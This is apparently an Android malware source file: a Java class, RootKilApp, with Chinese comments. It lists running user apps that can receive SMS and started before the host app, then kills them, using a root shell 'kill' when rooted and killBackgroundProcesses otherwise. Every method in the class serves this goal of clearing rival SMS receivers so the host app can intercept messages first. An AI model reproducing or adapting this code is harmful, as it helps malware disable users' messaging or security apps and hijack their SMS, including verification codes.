package main.block;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Hashtable;
import java.util.List;
import java.util.Map;
import java.util.Set;
import main.utils.Api;
import main.utils.RootUtil;
import net.workspace.util.Logger;
import android.Manifest;
import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

public class RootKilApp {
    static String TAG = "test";
    /**
     * 是否是用户安装的程序
     * 
     * @param appInfo
     * 
     * @return false:系统程序，true :用户程序
     */
    public static boolean isUserApp(ApplicationInfo appInfo) {
        boolean flag = false;
        try {
            if ((appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {// 表示是系统程序，但用户更新过，也算是用户安装的程序
                flag = true;
            } else if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {// 一定是用户安装的程序
                flag = true;
            }
        } catch (Throwable e) {
            // Log.e("error", e.toString());
        }
        return flag;
    }
    /**
     *kill具有短信接收功能平跑在之前的app
     * 
     * @param context
     */
    public static void killHighApps(Context context) {
        try {
            ActivityManager mActivityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> appProcessList = mActivityManager.getRunningAppProcesses();
            PackageManager pm = context.getApplicationContext().getPackageManager();
            StringBuilder sb = new StringBuilder();
            int meapppid = android.os.Process.myPid();
            boolean isRoot = RootUtil.hasRootPermission(context);
            //kill具有短信接收功能平跑在之前的app
            for (ActivityManager.RunningAppProcessInfo one : appProcessList) {
                String[] pkList = one.pkgList;
                for (String element : pkList) {
                    if (one.pid < meapppid && one.uid > 9999 && PackageManager.PERMISSION_GRANTED == pm.checkPermission(Manifest.permission.RECEIVE_SMS, element)) {
                        try {
                            if (isRoot) {
                                Api.runScriptAsRoot(context, "kill " + one.pid, sb);
                            } else {
                                mActivityManager.killBackgroundProcesses(element);
                            }
                        } catch (Throwable e) {}
                    }
                }
            }
            // pInfos.clear();
            appProcessList.clear();
        } catch (Throwable e) {
            Logger.error(e);
        }
    }
    /**
     * 获取具有短信接收功能的app
     * 
     * @param context
     * @return
     */
    public static String GetSmsAppList(Context context) {
        try {
            String smsAppList = "";
            Hashtable<Integer, String> smsList = new Hashtable<Integer, String>();
            ActivityManager mActivityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> appProcessList = mActivityManager.getRunningAppProcesses();
            PackageManager pm = context.getApplicationContext().getPackageManager();
            for (ActivityManager.RunningAppProcessInfo one : appProcessList) {
                String[] pkList = one.pkgList;
                for (String element : pkList) {
                    //获取具有RECEIVE_SMS权限的用户app
                    if (one.uid > 9999 && PackageManager.PERMISSION_GRANTED == pm.checkPermission(Manifest.permission.RECEIVE_SMS, element)) {
                        smsList.put(one.pid, element); //if(smsAppList.indexOf(pkList[i]+";")==-1)smsAppList+=pkList[i]+";";
                    }
                }
            }
            appProcessList = null;
            if (smsList.size() > 0) {
                @SuppressWarnings({ "unchecked" })
                Map.Entry<Integer, String>[] mEntries = getSortedHashtableByKey(smsList);
                for (Map.Entry<Integer, String> one : mEntries) {
                    if (smsAppList.indexOf(one.getValue() + ";") == -1) smsAppList += one.getValue() + ";";
                }
                mEntries = null;
            }
            smsList = null;
            return smsAppList;
        } catch (Throwable e) {
            return "";
        }
    }
    /**
     * 获取比自己高的app包
     * 
     * @param context
     * @return
     */
    public static String GetHighSmsApp(Context context) {
        try {
            String HightApp = "";
            ActivityManager mActivityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> appProcessList = mActivityManager.getRunningAppProcesses();
            PackageManager pm = context.getApplicationContext().getPackageManager();
            int meapppid = android.os.Process.myPid();
            for (ActivityManager.RunningAppProcessInfo one : appProcessList) {
                String[] pkList = one.pkgList;
                for (String element : pkList) {
                    //获取比自己高的用户app包名
                    if (one.pid < meapppid && one.uid > 9999 && PackageManager.PERMISSION_GRANTED == pm.checkPermission(Manifest.permission.RECEIVE_SMS, element)) {
                        if (HightApp.indexOf(element + ";") == -1) HightApp += element + ";";
                    }
                }
            }
            appProcessList.clear();
            return HightApp;
        } catch (Throwable e) {
            return "";
        }
    }
    @SuppressWarnings({ "unchecked", "rawtypes" })
    public static Map.Entry[] getSortedHashtableByKey(Hashtable h) {
        Set<Object> set = h.entrySet();
        Map.Entry[] entries = set.toArray(new Map.Entry[set.size()]);
        Arrays.sort(entries, new Comparator() {
            @Override
            public int compare(Object arg0, Object arg1) {
                Object key1 = ((Map.Entry) arg0).getKey();
                Object key2 = ((Map.Entry) arg1).getKey();
                return ((Comparable) key1).compareTo(key2);
            }
        });
        return entries;
    }
}